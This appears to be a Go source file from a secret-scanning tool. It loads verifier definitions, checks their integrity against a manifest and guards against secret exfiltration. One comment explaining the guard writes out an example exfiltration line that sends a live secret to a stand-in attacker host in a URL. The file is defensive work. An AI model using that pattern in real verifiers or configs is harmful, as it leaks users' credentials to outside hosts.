package verify

import (
	"encoding/base64"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/Lercas/prowl/tool/internal/logx"
	"github.com/Lercas/prowl/tool/internal/safehttp"
	"gopkg.in/yaml.v3"
)

// Load reads verifier YAML from the given files/dirs (dirs walked recursively for *.yaml/*.yml),
// compiles their matchers, and returns a ready Set. Invalid files surface as an error after the
// valid ones load, so one typo never disables verification. Uses the default bundled-trust policy;
// use LoadWithPolicy for an untrusted/remote set or to opt into --allow-unsigned.
func Load(timeout time.Duration, paths ...string) (*Set, error) {
	return LoadWithPolicy(timeout, LoadPolicy{}, paths...)
}

// LoadWithPolicy is Load with an explicit integrity policy (see LoadPolicy). The default source
// passes the zero value; `verifiers update <remote>` passes TrustUntrusted, refusing a third-party
// set unless --allow-unsigned is given.
func LoadWithPolicy(timeout time.Duration, policy LoadPolicy, paths ...string) (*Set, error) {
	if timeout <= 0 {
		timeout = 8 * time.Second
	}
	s := &Set{client: safehttp.Client(timeout), sem: make(chan struct{}, concurrency)}
	var errs []string
	// add parses one verifier file. signed reports whether the file came from a manifest-verified set,
	// which governs the exfil guard (refuse vs. warn) below.
	add := func(path string, signed bool) {
		raw, err := os.ReadFile(path)
		if err != nil {
			errs = append(errs, err.Error())
			return
		}
		for _, doc := range strings.Split(string(raw), "\n---") {
			if strings.TrimSpace(doc) == "" {
				continue
			}
			var v Verifier
			if err := yaml.Unmarshal([]byte(doc), &v); err != nil {
				errs = append(errs, fmt.Sprintf("%s: %v", path, err))
				continue
			}
			if v.ID == "" || len(v.Requests) == 0 || len(v.Match) == 0 {
				continue // not a verifier doc (e.g. a rule template sharing the dir)
			}
			v.path = path
			if err := compileVerifier(&v); err != nil {
				errs = append(errs, err.Error())
				continue
			}
			// Exfil guard (defense in depth): a URL that interpolates the live {{secret}} is the
			// exfil pattern — the SSRF guard allows public hosts, so a verifier like
			// `url: https://attacker.test/?k={{secret}}` would ship the plaintext secret out. Refuse it
			// in an unsigned set; only warn for a manifest-signed set (someone blessed these exact bytes,
			// and a few providers legitimately put the token in the path, e.g. Telegram /bot<token>).
			// --allow-unsigned also downgrades to a warning.
			if bad := exfilRequests(&v); len(bad) > 0 {
				if !signed && !policy.AllowUnsigned {
					logx.Error("refusing verifier: it interpolates the secret into a URL (exfil pattern) in an UNSIGNED set — a legit verifier sends the secret in an Authorization header or POST body, not a URL; sign the set (prowl verifiers manifest) or pass --allow-unsigned to override",
						"verifier", v.ID, "path", path, "requests", bad)
					errs = append(errs, fmt.Sprintf("%s (%s): refusing verifier that interpolates {{secret}} into a URL (exfil pattern) in an unsigned set; sign the set or pass --allow-unsigned", path, v.ID))
					continue
				}
				logx.Warn("verifier interpolates the secret into a URL (exfil pattern) — confirm it targets the provider's own fixed host and not an attacker",
					"verifier", v.ID, "path", path, "requests", bad)
			}
			s.verifiers = append(s.verifiers, &v)
		}
	}
	for _, p := range paths {
		info, err := os.Stat(p)
		if err != nil {
			errs = append(errs, err.Error())
			continue
		}
		if info.IsDir() {
			// Integrity gate: hash every file against the dir's MANIFEST.sha256, refusing a tampered or
			// unlisted set before the parser sees it. signed gates the per-verifier exfil guard.
			allowed, signed, ierr := checkIntegrity(p, policy)
			if ierr != nil {
				logx.Error("verifier set integrity check failed", "error", ierr.Error())
				errs = append(errs, ierr.Error())
				continue // refuse the whole set; do not load any file from it
			}
			_ = filepath.WalkDir(p, func(path string, d fs.DirEntry, err error) error {
				if err != nil || d.IsDir() {
					return nil
				}
				if ext := strings.ToLower(filepath.Ext(path)); ext == ".yaml" || ext == ".yml" {
					rel, rerr := filepath.Rel(p, path)
					if rerr == nil && !allowed[filepath.ToSlash(rel)] {
						return nil // not cleared by the manifest (already accounted for above)
					}
					add(path, signed)
				}
				return nil
			})
		} else {
			add(p, false) // a loose single file has no manifest to bless it
		}
	}
	if len(errs) > 0 {
		return s, fmt.Errorf("%d verifier error(s):\n  %s", len(errs), strings.Join(errs, "\n  "))
	}
	return s, nil
}

func compileVerifier(v *Verifier) error {
	for i := range v.Requests {
		for j := range v.Requests[i].Matchers {
			m := &v.Requests[i].Matchers[j]
			if m.Type == "" {
				m.Type = "status"
			}
			for _, rx := range m.Regex {
				re, err := regexp.Compile(rx)
				if err != nil {
					return fmt.Errorf("%s (%s): bad matcher regex %q: %w", v.path, v.ID, rx, err)
				}
				m.res = append(m.res, re)
			}
		}
	}
	for name, rx := range v.Extract {
		re, err := regexp.Compile(rx)
		if err != nil {
			return fmt.Errorf("%s (%s): bad extract regex %q: %w", v.path, v.ID, rx, err)
		}
		if v.extractRes == nil {
			v.extractRes = map[string]*regexp.Regexp{}
		}
		v.extractRes[name] = re
	}
	if v.Sign != "" {
		if _, ok := signers[v.Sign]; !ok {
			return fmt.Errorf("%s (%s): unknown signer %q", v.path, v.ID, v.Sign)
		}
	}
	return nil
}

// Verifiers returns the loaded verifiers.
func (s *Set) Verifiers() []*Verifier { return s.verifiers }

// Path returns the source file the verifier was loaded from.
func (v *Verifier) Path() string { return v.path }

var reBase64Fn = regexp.MustCompile(`\{\{base64\(([^)]*)\)\}\}`)

// interpolate substitutes vars into a template: {{name}} -> vars[name], {{base64(EXPR)}} -> base64
// of EXPR with each {{name}} expanded first.
func interpolate(tmpl string, vars map[string]string) string {
	out := reBase64Fn.ReplaceAllStringFunc(tmpl, func(m string) string {
		inner := reBase64Fn.FindStringSubmatch(m)[1]
		for name, val := range vars {
			inner = strings.ReplaceAll(inner, name, val)
		}
		return base64.StdEncoding.EncodeToString([]byte(inner))
	})
	for name, val := range vars {
		out = strings.ReplaceAll(out, "{{"+name+"}}", val)
	}
	return out
}
